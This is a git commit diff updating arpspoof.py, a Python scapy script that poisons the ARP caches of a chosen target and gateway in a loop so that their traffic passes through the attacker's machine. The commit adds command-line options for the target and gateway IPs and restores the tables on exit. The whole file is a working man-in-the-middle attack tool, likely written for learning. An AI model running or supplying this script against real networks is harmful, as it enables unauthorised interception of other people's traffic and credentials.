f67b1fd685b0b24a91fbc5a709e87eb18566e1e8
0d1nss0n <115773776+0d1nss0n@users.noreply.github.com>
2022-10-18 06:38:01 +0000

    Update arpspoof.py

--- arpspoof.py
+++ arpspoof.py
@@ -1,21 +1,40 @@
 #!/usr/bin/env python3
-import sys
+
+import optparse
+import time
 
 import scapy.all as scapy
-import time
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_ip", help="use -t to set IP of target")
+    parser.add_option("-g", "--gateway", dest="gateway_ip", help="use -g to set IP of the gateway")
+    (options, arguments) = parser.parse_args()
+    if not options.target_ip:
+        parser.error("[-] Please specify a target IP, --help for more info")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify the gateway IP, use --help for more info")
+    return options
+
+
+options = get_arguments()
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
+    arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
     return answered_list[0][1].hwsrc
+
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -23,19 +42,18 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "10.0.0.50"
-gateway_ip = "10.0.0.1"
 
 try:
     sent_packets_count = 0
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
+        spoof(options.target_ip, options.gateway_ip)
+        spoof(options.gateway_ip, options.target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent " + str(sent_packets_count), end="")
         time.sleep(2)
 
+
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ...... Quitting.")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    print("\n[+] Detected CTRL + C ...... Restoring ARP Tables.... Please Wait.\n")
+    restore(options.gateway_ip, options.target_ip)
+    restore(options.target_ip, options.gateway_ip)
